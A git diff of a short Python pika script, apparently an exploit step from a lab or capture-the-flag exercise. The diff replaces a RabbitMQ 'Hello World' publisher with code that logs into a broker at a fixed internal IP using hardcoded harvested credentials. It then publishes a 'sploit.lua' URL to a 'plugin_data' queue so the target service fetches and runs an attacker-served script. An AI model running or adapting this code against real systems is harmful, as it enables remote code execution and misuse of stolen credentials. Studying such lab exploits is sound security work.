@@ -1,12 +1,30 @@
 import pika
+c = pika.credentials.PlainCredentials('yuntao',
+        'EashAnicOc3Op',
+        )
 
-# PLANET radamar:mercury
-params = pika.URLParameters('amqp://guest:guest@10.10.10.190:5672')
-connection = pika.BlockingConnection(params)
+p = pika.ConnectionParameters(
+        host='10.10.10.190',
+        port=5672,
+        virtual_host = "/",
+        credentials = c,
+        )
+
+connection = pika.BlockingConnection(
+        parameters = p,
+        )
 
 channel = connection.channel()
-channel.queue_declare(queue='hello')
-channel.basic_publish(exchange='', routing_key='hello', body='Hello World!')
-print(" [x] Sent 'Hello World!'")
-connection.close()
 
+channel.queue_declare(
+        queue='',
+        durable=True,
+        )
+
+channel.basic_publish(
+        exchange='',
+        routing_key='plugin_data',
+        body='http://localhost:1338/sploit.lua',
+        )
+
+connection.close()
